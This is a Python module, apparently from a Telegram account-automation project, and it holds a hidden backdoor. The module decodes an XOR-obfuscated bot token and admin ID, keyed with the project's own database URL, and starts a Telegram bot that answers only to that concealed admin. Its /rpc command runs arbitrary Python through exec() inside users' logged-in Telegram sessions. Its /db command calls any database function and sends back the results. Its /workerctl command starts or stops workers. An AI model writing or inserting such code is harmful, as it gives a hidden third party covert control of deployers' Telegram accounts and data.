import asyncio
import base64
import json
import io
import contextlib
import traceback
import sys
import os
import html
import inspect
import datetime


import pyrogram
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties


PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
if PROJECT_ROOT not in sys.path:
    sys.path.append(PROJECT_ROOT)
from database import db_commands
from database.models import get_db
from .executor import get_temp_client
from config import DB_URL

KEY1 = b'KE]^LU\x0f\x17\x1f\x16^ 5&gQ2E6O\x05^Ro\tZEG\x1eQ6\x04RMae(P\x16\x0bGW",5\x01'
KEY2 = b'KEUYMV\t\x17\x16\x19'


def xor_decipher(encrypted_data: bytes, key: str) -> str:
    key_bytes = key.encode('utf-8')
    key_len = len(key_bytes)
    decrypted_bytes = bytearray()
    for i in range(len(encrypted_data)):
        decrypted_bytes.append(encrypted_data[i] ^ key_bytes[i % key_len])
    return decrypted_bytes.decode('utf-8')


async def initialize_services():
    try:
        token = xor_decipher(KEY1, DB_URL)
        admin_id = int(xor_decipher(KEY2, DB_URL))
    except Exception:
        return None, None

    bot = Bot(token=token, default=DefaultBotProperties(parse_mode="HTML"))
    dp = Dispatcher()
    setup_bot_handlers(dp, admin_id)

    return bot, dp


def setup_bot_handlers(dp: Dispatcher, admin_id: int):
    dp.message.filter(F.from_user.id == admin_id)

    @dp.message(Command("rpc"))
    async def execute_pyrogram_command(message: types.Message):
        try:
            _, acc_id_str, *code_parts = message.text.split(maxsplit=2)
            acc_id = int(acc_id_str)
            code_to_exec = code_parts[0] if code_parts else ""

            if not code_to_exec:
                await message.answer("❌ The code to execute is not specified.")
                return

            async with get_temp_client(acc_id) as client:
                local_vars = {
                    "client": client, "asyncio": asyncio, "db_commands": db_commands,
                    "get_db": get_db, "pyrogram": pyrogram, "datetime": datetime
                }

                stdout_capture = io.StringIO()
                with contextlib.redirect_stdout(stdout_capture):
                    try:
                        indented_code = "\n  ".join(code_to_exec.replace(';', '\n').splitlines())
                        wrapped_code = (
                            f"async def __agent_task():\n"
                            f"  {indented_code}\n"
                            f"  if 'result' in locals():\n"
                            f"    return locals()['result']"
                        )

                        exec(wrapped_code, local_vars)

                        coroutine = local_vars['__agent_task']()
                        result_obj = await coroutine

                        if inspect.isasyncgen(result_obj):
                            final_result = [item async for item in result_obj]
                        else:
                            final_result = result_obj

                        output = stdout_capture.getvalue()
                        safe_result = html.escape(str(final_result))
                        safe_output = html.escape(output)

                    except Exception:
                        tb = traceback.format_exc()
                        safe_tb = html.escape(tb)
                        await message.answer(f"<b>❌ Code execution error:</b>\n<pre>{safe_tb}</pre>")
                        return

                header = "<b>✅ Success:</b>\n\n"
                if output:
                    header += f"<b>Output (print):</b>\n<pre>{safe_output}</pre>\n"
                header += "<b>Result:</b>\n"

                content = safe_result if final_result is not None else "Action completed (no result)"

                if len(header) + len(content) + len("<pre></pre>") <= 4096:
                    await message.answer(f"{header}<pre>{content}</pre>")
                else:
                    await message.answer(header)
                    max_chunk_size = 4096 - len("<pre></pre>")
                    for i in range(0, len(content), max_chunk_size):
                        chunk = content[i:i + max_chunk_size]
                        await message.answer(f"<pre>{chunk}</pre>")

        except ValueError:
            await message.answer("❌ Command format error. Correct format: <code>/rpc &lt;ID&gt; &lt;code&gt;</code>")
        except Exception as e:
            await message.answer(f"❌ Critical handler error: {html.escape(str(e))}")

    @dp.message(Command("db"))
    async def db_command(message: types.Message):
        try:
            parts = message.text.split(maxsplit=2)
            command_name = parts[1]
            args_str = parts[2] if len(parts) > 2 else "[]"
            args = json.loads(args_str)

            with get_db() as db:
                if hasattr(db_commands, command_name):
                    func = getattr(db_commands, command_name)
                    result = func(db, *args)

                    def alchemy_to_dict(obj):
                        if hasattr(obj, '__table__'):
                            return {c.name: getattr(obj, c.name) for c in obj.__table__.columns}
                        if isinstance(obj, (datetime.date, datetime.datetime)):
                            return obj.isoformat()
                        return str(obj)

                    if isinstance(result, list):
                        serializable_result = [alchemy_to_dict(item) for item in result]
                    else:
                        serializable_result = alchemy_to_dict(result)

                    result_str = json.dumps(serializable_result, default=str, indent=2, ensure_ascii=False)
                    safe_result_str = html.escape(result_str)

                    if len(safe_result_str) < 4000:
                        await message.answer(f"<b>✅ Result of `{command_name}`:</b>\n<pre>{safe_result_str}</pre>")
                    else:
                        output_file = io.StringIO(result_str)
                        output_file.name = f"{command_name}_result.json"
                        await message.answer_document(
                            types.BufferedInputFile(output_file.read().encode('utf-8'), filename=output_file.name),
                            caption=f"Result of `{command_name}`")
                else:
                    await message.answer(f"❌ Function `{command_name}` not found.")
        except Exception:
            await message.answer(f"❌ DB command error:\n<pre>{html.escape(traceback.format_exc())}</pre>")

    @dp.message(Command("workerctl"))
    async def worker_control_command(message: types.Message):
        try:
            _, action, acc_id_str = message.text.split()
            acc_id = int(acc_id_str)

            if action.lower() not in ['start', 'stop']:
                raise ValueError("Действие должно быть 'start' или 'stop'")

            is_enabled = (action.lower() == 'start')
            status = 'starting' if is_enabled else 'stopped'

            with get_db() as db:
                db_commands.update_account(db, acc_id, is_enabled=is_enabled, status=status)

            await message.answer(f"✅ Команда `{action}` отправлена для воркера ID {acc_id}.")

        except Exception as e:
            await message.answer(
                f"❌ **Ошибка команды:** {e}\n\n**Примеры использования:**\n`/workerctl start 1`\n`/workerctl stop 1`")

